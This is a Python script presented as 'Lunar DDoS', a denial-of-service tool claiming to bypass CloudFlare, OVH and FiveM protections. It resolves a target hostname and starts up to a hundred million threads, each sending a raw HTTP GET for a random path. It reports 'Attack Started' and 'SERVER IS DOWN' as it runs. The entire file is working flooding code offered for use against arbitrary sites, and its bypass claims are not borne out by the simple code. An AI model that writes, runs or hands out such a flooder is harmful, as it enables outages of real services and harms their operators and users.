import random
import socket
import string
import sys
import threading
import time


host = ""
ip = ""
port = 0
num_requests = 0



def banner():
    print('''
            

    /\_____/\     
   /  o   o  \    
  ( ==  ^  == )   GitHub: https://www.github.com/ognj8n
   )         (    Discord Support: ogi#0001
  (           )   ========================================================
 ( (  )   (  ) )  Lunar DDoS - Bypass CloudFlare,OVH,FiveM
(__(__)___(__)__) Version: [ 0.1 ]          ''')

banner()
time.sleep(3)

if len(sys.argv) == 2:
    port = 80
    num_requests = 100000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    print ("\n Usage >> " + sys.argv[0] + " < Hostname > < Port >")
    num_requests = int(sys.argv[3])
else:
    sys.exit(1)


try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print (" Make sure you entered a correct website ")
    sys.exit(2)


thread_num = 0
thread_num_mutex = threading.Lock()



def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    print ("\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] << Threads Sent ♥ ")

    thread_num_mutex.release()


def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


def attack():
    print_status()
    url_path = generate_url_path()

    
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        dos.connect((ip, port))

        
        msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host)
        byt = msg.encode()
        dos.send(byt)
    except socket.error:
        print ("\n [ ♥ SERVER IS DOWN ♥ ]: " + str(socket.error))
    finally:
        
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


print ("[♥] Attack Started  " + host + " (" + ip + ") || Port >>  " + str(port) + " || Requests >> " + str(num_requests))

all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    
    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join() 

